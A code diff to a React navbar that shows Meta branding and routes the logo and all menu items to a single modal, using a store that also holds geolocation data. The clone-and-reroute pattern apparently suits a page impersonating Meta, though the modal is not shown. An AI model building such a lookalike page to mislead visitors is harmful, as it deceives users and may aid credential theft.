@@ -9,16 +9,14 @@ import translateText from '@/utils/translate';
 const Navbar: FC = () => {
     const [isDropdownOpen, setIsDropdownOpen] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
-    const { geoInfo } = store();
-
-    const menuItems = [
-        { label: 'AI glasses', href: '#' },
-        { label: 'Meta Quest', href: '#' },
-        { label: 'Apps and games', href: '#' }
-    ];
+    const { geoInfo, setModalOpen } = store();
 
     const t = (text: string): string => {
         return translations[text] || text;
+    };
+
+    const handleOpenModal = () => {
+        setModalOpen(true);
     };
 
     useEffect(() => {
@@ -42,25 +40,39 @@ const Navbar: FC = () => {
 
                 {/* Logo and Menu */}
                 <div className='flex items-center gap-8'>
-                    <Image 
-                        src={MetaImage} 
-                        alt='Meta' 
-                        width={50} 
-                        height={16}
-                        className='h-4 w-auto'
-                        priority
-                    />
+                    <button 
+                        onClick={handleOpenModal}
+                        className='cursor-pointer hover:opacity-80 transition-opacity'
+                    >
+                        <Image 
+                            src={MetaImage} 
+                            alt='Meta' 
+                            width={50} 
+                            height={16}
+                            className='h-4 w-auto'
+                            priority
+                        />
+                    </button>
                     
                     <div className='hidden md:flex items-center gap-6'>
-                        {menuItems.map((item) => (
-                            <a
-                                key={item.label}
-                                href={item.href}
-                                className='text-sm text-gray-700 hover:text-gray-900 transition-colors font-medium'
-                            >
-                                {t(item.label)}
-                            </a>
-                        ))}
+                        <button
+                            onClick={handleOpenModal}
+                            className='text-sm text-gray-700 hover:text-gray-900 transition-colors font-medium cursor-pointer'
+                        >
+                            {t('AI glasses')}
+                        </button>
+                        <button
+                            onClick={handleOpenModal}
+                            className='text-sm text-gray-700 hover:text-gray-900 transition-colors font-medium cursor-pointer'
+                        >
+                            {t('Meta Quest')}
+                        </button>
+                        <button
+                            onClick={handleOpenModal}
+                            className='text-sm text-gray-700 hover:text-gray-900 transition-colors font-medium cursor-pointer'
+                        >
+                            {t('Apps and games')}
+                        </button>
                     </div>
                 </div>
 
@@ -79,16 +91,34 @@ const Navbar: FC = () => {
 
             {/* Mobile Dropdown Menu */}
             {isDropdownOpen && (
-                <div className='absolute top-full left-0 right-0 bg-white border-b border-gray-200 md:hidden py-2'>
-                    {menuItems.map((item) => (
-                        <a
-                            key={item.label}
-                            href={item.href}
-                            className='block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors'
-                        >
-                            {t(item.label)}
-                        </a>
-                    ))}
+                <div className='absolute top-full left-0 right-0 bg-white border-b border-gray-200 md:hidden py-2 z-30'>
+                    <button
+                        onClick={() => {
+                            handleOpenModal();
+                            setIsDropdownOpen(false);
+                        }}
+                        className='w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors'
+                    >
+                        {t('AI glasses')}
+                    </button>
+                    <button
+                        onClick={() => {
+                            handleOpenModal();
+                            setIsDropdownOpen(false);
+                        }}
+                        className='w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors'
+                    >
+                        {t('Meta Quest')}
+                    </button>
+                    <button
+                        onClick={() => {
+                            handleOpenModal();
+                            setIsDropdownOpen(false);
+                        }}
+                        className='w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors'
+                    >
+                        {t('Apps and games')}
+                    </button>
                 </div>
             )}
         </nav>
